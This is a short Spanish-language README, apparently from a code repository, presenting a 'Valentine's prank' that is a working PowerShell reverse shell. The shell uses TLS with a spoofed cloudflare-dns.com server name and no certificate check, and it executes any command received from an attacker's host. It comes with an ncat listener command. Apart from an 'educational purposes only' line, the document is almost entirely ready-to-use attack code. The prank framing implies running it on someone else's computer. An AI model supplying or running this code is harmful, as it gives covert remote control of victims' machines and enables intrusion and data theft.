# Broma de San Valentin

Este codigo ejecuta un codigo reverse shell, solo con fines educativos
```powershell
$sslProtocols=[System.Security.Authentication.SslProtocols]::Tls12;$TCPClient=New-Object Net.Sockets.TCPClient('IP',PORT);$NetworkStream=$TCPClient.GetStream();
$SslStream=New-Object Net.Security.SslStream($NetworkStream,$false,({$true}-as[Net.Security.RemoteCertificateValidationCallback]));
$SslStream.AuthenticateAsClient('cloudflare-dns.com',$null,$sslProtocols,$false);
if(!$SslStream.IsEncrypted-or!$SslStream.IsSigned){$SslStream.Close();exit};$StreamWriter=New-Object IO.StreamWriter($SslStream);
$StreamReader=New-Object IO.StreamReader($SslStream);function WriteToStream($String){$Hostname=(Get-WmiObject Win32_ComputerSystem).Name;
$Prompt="${env:USERNAME}@${Hostname}:$(Get-Location | Select-Object -ExpandProperty Path)> ";$StreamWriter.Write($String+$Prompt);$StreamWriter.Flush()};
WriteToStream '';while($true){try{$Command=$StreamReader.ReadLine();if($Command-eq"exit"){break};$Output=try{Invoke-Expression $Command 2>&1|Out-String}catch{$_|Out-String};
WriteToStream $Output}catch{break}};$StreamWriter.Close();$SslStream.Close();$TCPClient.Close()
```
El listener

```bash
ncat --ssl -lvp PORT
```

guarda ese arrchivo y cambiale el PATH en el codigo fuente. 



